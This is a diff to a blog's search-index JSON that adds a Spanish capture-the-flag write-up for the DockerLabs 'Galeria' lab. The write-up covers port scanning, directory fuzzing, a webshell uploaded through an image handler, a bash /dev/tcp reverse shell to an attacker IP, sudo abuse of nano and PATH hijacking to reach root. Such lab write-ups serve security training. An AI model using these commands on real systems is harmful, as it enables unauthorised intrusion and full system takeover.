@@ -1,6 +1,23 @@
 [
   
   {
+    "title": "Galeria, DockerLabs",
+    "url": "/posts/galeria/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico, fuzzing, nmap, feroxbuster, searchbins, pathjacking",
+    "date": "2025-05-16 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              fuzzing directorios y ficheros      fero...",
+    "content": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              fuzzing directorios y ficheros      feroxbuster              revshell      bash              escalada de privilegios      nano              Pahthijacking      creacion de script      Reconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX walkingdead 172.18.0.2reporteComo vemos en el reporte en esta ocasion tenemos varios puertos abiertos el el 21 ftp, el 80 httpYo no encontre nada interesante en el ftp pero si en el http, en este caso la web es una galeria de imagenes y aplicandole fuzzing aparecen cositas interesantes.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php -t 400 -u http://172.17.0.2De todo eso eso nos interesa el handler.php, que es un script que se encarga de subir imagenes a la galeria.Tratandose de una facil directamente subo un una webshell.php y me la ejecuto.Ahora solo debemos ir a la ruta donde sea subido que deberia ser la misma de donde estan las fotos en feroxbuster lo hemos visto antes.Desde la webshell puedes hacer lo que el usuario te permita pero yo la uso para mandarme un revshell “es lo que tenia a mano” no sin antes ponernos en escucha con ncnc -lvnp 1188bash -c 'exec bash -i &amp;&gt;/dev/tcp/192.168.0.106/1188 &lt;&amp;1'Como la terminal no parece ser un tty le realizo **tratamiento de la tty .script /dev/null -c bash    control Z con esto la pasamos a segundo plano  stty raw -echo ; fg  reset    en otra terminal lanzamos stty size para saber el numero de filas y columnas de nuestra terminal  export TERM=xterm  export SHELL=bash  stty rows 32 columns 149Infiltracion y escalada de privilegiosAhora que tenemos acceso a la terminal de la maquina, lo primero que hacemos es ver que usuario somos.whoamiObvio somo www-data , ejecutamos lo tipico sudo -l.Vemos que podemos ejecutar como gallery el otro usuario no se que pinta dado que ya soy el.searchbins -b nano -f sudosudo -u gallery /usr/bin/nanoy seguimos los pasos de searchbins para convertirnos en gallery.Ya como gallery hacemos lo mismosudo -lEn esta ocasion nos han dejado un binario que podemos ejecutar como root.Observemos lo que haceVemos que trata de convertir imagenes con un comando que se incluye en imagemagick o al menos antes formaba parte del paquete , pero bueno la cuestion es que no lo encuentra y lo que vamos a hacer es crearnos un script en nuestro home con el nombre convert y le damos permisos de ejecucion y posteriormente añadimos la ruta donde hemos creado el script al path de la variable de entorno.echo \"/bin/bash -p\" &gt; /home/gallery/convertchmod +x /home/gallery/convertexport PATH=/home/gallery:$PATHAhora si ejecutamos el binario como root nos da una shell de root.Muchas gracias a difundir y compartir lo que sabemos."
+  },
+  
+  {
     "title": "TheDog , DockerLabs",
     "url": "/posts/thedog/",
     "categories": "DockerLabs",
